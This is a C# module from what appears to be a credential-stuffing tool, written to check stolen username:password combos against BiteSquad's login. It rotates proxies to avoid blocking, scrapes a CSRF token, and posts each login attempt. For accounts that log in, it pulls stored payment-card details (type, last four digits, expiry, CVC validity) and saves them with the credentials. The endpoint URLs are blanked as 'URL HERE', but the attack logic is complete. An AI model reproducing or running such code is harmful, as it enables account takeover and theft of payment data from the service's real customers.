using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class BiteSquad
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                httpRequest.AddHeader("origin", "https://www.bitesquad.com");
                httpRequest.AddHeader("referer", "https://www.bitesquad.com/login");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                string st1 = httpRequest.Get("URL HERE").ToString();
                string ctok = Cryptography.LR(st1, "csrf_token\" value = \"", "\"").FirstOrDefault();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                httpRequest.AddHeader("origin", "https://www.bitesquad.com");
                httpRequest.AddHeader("referer", "https://www.bitesquad.com/login");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                string str2 = httpRequest.Post("URL HERE", "_csrf_token=" + ctok + "&_target_path=%2F&_username=" + strArray1[0] + "&_password=" + strArray1[1], "application/x-www-form-urlencoded").ToString();
                string rem = httpRequest.Cookies.GetCookies("URL HERE")["REMEMBERME"].ToString();
                if (!string.IsNullOrEmpty(rem) || str2.Contains("https://www.bitesquad.com/"))
                {
                    string time = DateTimeOffset.Now.ToUnixTimeMilliseconds().ToString();
                    httpRequest.ClearAllHeaders();
                    httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                    httpRequest.AddHeader("origin", "https://www.bitesquad.com");
                    httpRequest.AddHeader("referer", "https://www.bitesquad.com/login");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                    string str3 = httpRequest.Get("URL HERE" + time + "126").ToString();
                    if (str3.Contains("[]"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo}", Color.Orange);
                        }
                        Program.Save(combo, "BiteSquad Free");
                        return true;
                    }
                    else
                    {
                        string exp = Cryptography.LR(str3, "expYear\":\"", "\"").FirstOrDefault();
                        string expm = Cryptography.LR(str3, "expMonth\":\"", "\"").FirstOrDefault();
                        string cvc = Cryptography.LR(str3, "isCvcValid\":", "}").FirstOrDefault();
                        string ctype = Cryptography.LR(str3, "type\":\"", "\"").FirstOrDefault();
                        string lfour = Cryptography.LR(str3, "lastFour\":\"", "\"").FirstOrDefault();
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine(combo, Color.Green);
                        }
                        Program.Save(combo + $"Card Type: {ctype} | Last 4: {lfour} | Expiry: {expm}/{exp} | CVC: {cvc}", "BiteSquad Capture");
                        return true;
                    }
                }
                else if (str2.Contains("Invalid username or password"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    Program.remove(combo);
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
